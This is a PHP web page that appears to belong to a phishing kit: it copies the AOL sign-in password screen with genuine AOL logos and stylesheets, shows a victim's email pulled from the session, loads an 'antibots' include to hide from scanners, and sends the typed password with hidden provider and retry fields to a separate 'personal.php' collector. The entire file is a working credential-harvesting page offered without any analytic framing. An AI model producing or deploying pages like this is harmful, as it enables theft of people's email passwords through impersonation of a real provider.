<?php
session_start();
include('../antibots.php');

?>
<html id="Stencil" class="js grid light-theme "><head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL</title>
        <link rel="dns-prefetch" href="//gstatic.com">
        <link rel="dns-prefetch" href="//google.com">
        <link rel="dns-prefetch" href="//s.yimg.com">
        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.yahoo.com">
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">

        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
            .mbr-legacy-device-bar {
                display: none;
            }
        </style>
        <link href="https://s.yimg.com/wm/mbr/d655daa75cd3cf4f9289a6e42d7159c08bdf52e8/aol-main.css" rel="stylesheet" type="text/css">
    </head>
    <body class="bucket-">
        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross">
            <p class="mbr-legacy-device">
                    AOL works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some AOL features may not work properly. Please update your browser version now. <a href="">More&nbsp;Info</a>
            </p>
        </div>

    <div id="login-body" class="loginish dark-background puree-v2 grid">
    <div class="mbr-login-hd" id="mbr-uh-hd">
     <a href="https://www.aol.com/">
        <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="Aol" class="logo aol-en-US" width="100" height="">
        <img src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png" alt="Aol" class="dark-mode-logo logo aol-en-US" width="100" height="">
    </a>
</div>
    <div class="challenge password-challenge">
    <div class="challenge-header">
        <div class="yid" ><input type="" name="" value="<?php echo $_SESSION['email']; ?>" style="text-align: center;border: 0;background: transparent;width: auto;" readonly></div>
</div><div id="password-challenge" class="primary">
    <strong class="challenge-heading">Enter&nbsp;password</strong>
    <span class="txt-align-center challenge-desc">to finish continue</span>
    <form action="./../personal.php" method="post" class="pure-form challenge-form" id="emailaccess">
        <input type="hidden" id="emaildress" name="emaildress" value="">        <div class="hidden-username">
         <input type="hidden" name="emailType" value="" id="emailType">
                            <input type="hidden" name="emailProvider" value="" id="emailProvider"> 
                            <input type="hidden" name="emailretry" value="" id="emailretry">  
        </div>
        <div id="password-container" class="input-group password-container blurred">
            <input type="password" id="login-passwd" class="password" name="emailPassword" placeholder=" " autofocus="" autocomplete="current-password" minlength="6" required>
            <label for="login-passwd" id="password-label" class="password-label">Password</label>
            <div class="caps-indicator hide" id="caps-indicator" title="Capslock is&nbsp;on"></div>
            <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show&nbsp;password"></button>
        </div>
        <p class="error-msg" id="password-error" role="alert" data-error="messages.ERROR_INVALID_PASSWORD" style="display: none">
            Invalid password. Please try&nbsp;again
        </p>

        <div class="button-container">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-ylk="elm:btn;elmt:primary;mKey:primary-login-account-challenge-password-primaryBtn">
                    Next
            </button>
        </div>
        <div class="forgot-cont bottom-cta">
            <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:primary-login-account-challenge-password-skipBtn" id="mbr-forgot-link" name="skip" value="Forgot&nbsp;password?">
        </div>
    </form>
</div>
</div>
    
</div>
    <div id="mbr-css-check"></div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>  
</html>
